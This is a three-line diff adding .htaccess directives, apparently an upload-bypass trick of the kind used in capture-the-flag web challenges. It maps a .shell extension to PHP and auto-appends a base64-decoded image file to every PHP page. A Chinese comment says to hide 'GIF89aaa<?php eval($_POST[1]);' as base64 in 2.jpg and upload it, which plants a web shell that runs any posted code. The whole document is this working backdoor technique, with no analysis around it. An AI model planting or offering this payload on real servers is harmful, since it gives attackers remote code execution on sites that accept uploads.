@@ -1,0 +1,3 @@
+AddType application/x-httpd-php .shell
+php_value auto_append_file "php://filter/convert.base64-decode/resource=2.jpg"
+# 将 GIF89aaa<?php eval($_POST[1]);  转base64写入2.jpg 并上传
